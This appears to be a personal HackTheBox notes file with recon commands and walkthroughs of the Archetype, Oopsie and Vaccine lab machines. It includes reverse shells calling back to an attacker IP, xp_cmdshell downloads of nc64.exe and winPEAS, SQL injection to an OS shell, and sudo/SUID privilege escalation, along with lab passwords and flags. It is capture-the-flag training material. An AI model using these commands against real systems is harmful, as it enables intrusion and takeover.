# HackTheBox

`telnet`

`ftp` `user anonymous`

`smbclient -L`

`smbclient //host/share`



```shell
redis-cli -h <host> -p <port>

info # check Keyspace
select <index>
keys *
get <key> # get value from key in database <index>
```



```shell
nmap

-T4 # 4 Threads
-p- # allports
-min-rate= # limit ports

-sV # Version Detection
-sT # TCP Connect

```



```shell
MariaDB:

mysql -h <host> -u <usename>

show databases
use <dbname>
```



```shell
gobuster

-x # specific filetype

gobuster dir -x .php --url <host> --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

gobuster dir --url http://s3.thetoppers.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```



```shell
aws

aws configure

aws s3 --endpoint=<url> <command> s3://<host>/<file>


```



```
php WebShell

another-ob....php:
GET /shell.php?lol=<command>
```





## ARCHETYPE

```shell
sql_svc password:
M3g4c0rp123

impacket-mssqlclient ARCHETYPE/sql_svc:'M3g4c0rp123'@10.129.234.199 -port 1433 -windows-auth

user flag:
3e7b102e78218e935bf3f4951fec21a3

# setup a server locally, and download nc64/winPEAS to remote machine.
sudo python3 -m http.server 80
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.65/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.65/winPEAS.bat -outfile winPEAS.bat"
# local machine listen to 443
linux> sudo nc -lvnp 443
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.65 443"

impacket-psexec administrator:"MEGACORP_4dm1n\!\!"@10.129.234.199

root flag:
b91ccec3305e98240082d4474b848528
```



## OOPSIE

In burp's sitemap (target tab), we know that `/cdn-cgi/login` is where we login the site.

In `http://{target-ip}/cdn-cgi/login/admin.php?content=accounts&id=1`, we get cookie's ID/role easily.

Then we can upload reverse shell. Use `gobuster` to find where the shell goes.

`gobuster dir --url http://{TARGET_IP}/ --wordlist
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php`

After a while, we see a suspicious folder called `uploads`, it might be what we want.

```shell
# listening to reverse shell. (modify ip and port in phpshell file)
sudo nc -lvnp 1234
```

open `http://megacorp.com/uploads/php-reverse-shell.php` then `nc` will open a shell for us.

```shell
user flag:
f2c74ee8db7983851ab2a96a44eb7981 # in /home/robert/user.txt

python3 -c 'import pty;pty.spawn("/bin/bash")'

cat /var/www/html/cdn-cgi/login/* | grep -i passw*
cat db.php

robert pw:
M3g4C0rpUs3r! # su robert
admin pw:
MEGACORP_4dm1n!! # useless

sudo -l
id # we know we are in a group "bugtracker"

find / -group bugtracker 2>/dev/null # find binary owned by this group

ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
# from output, we know this is a suid set on the binary.

bugtracker # execute this and input random string, we get an error indicated that it execute `cat`

echo "/bin/sh" > /tmp/cat # /tmp can be access to all user
chmod 777 /tmp/cat
export PATH=/tmp:$PATH # add /tmp to the beginning of PATH, so when executing `cat`, it will always execute `/tmp/cat` instead of `/bin/cat`

whoami # root

cat /root/root.txt
# af13b0bee69f8a877c3faf667f7beacf
```



## VACCINE

```shell
ftp # using anonymous to login
get backup.zip

zip2john backup.zip > ziphash
john ziphash # get zip password

# unzip it and cat php file we get md5-hashed passwd
echo '2cb42f8734ea607eefed3b70af13bbd3' > md5hash
john md5hash --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
# site login user:admin passwd:qwerty789

# get phpsessid from cookies
sqlmap http://10.129.97.233/dashboard.php\?search\= --os-shell --cookie="PHPSESSID=..."  --threads 4

# nc interactive shell
# local 
sudo nc -lvnp 443
# remote
bash -c "bash -i >& /dev/tcp/{local_ip}/443 0>&1"

user flag:
ec9b13ca4d6229cd5cc1e09980965bf7

cat /var/www/html/dashboard.php
# postgres user password: P@s5w0rd!

sudo -l -S

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

:set shell=/bin/bash
:shell

root flag:
dd6e058e814260bc70e9bbdef2715849
```



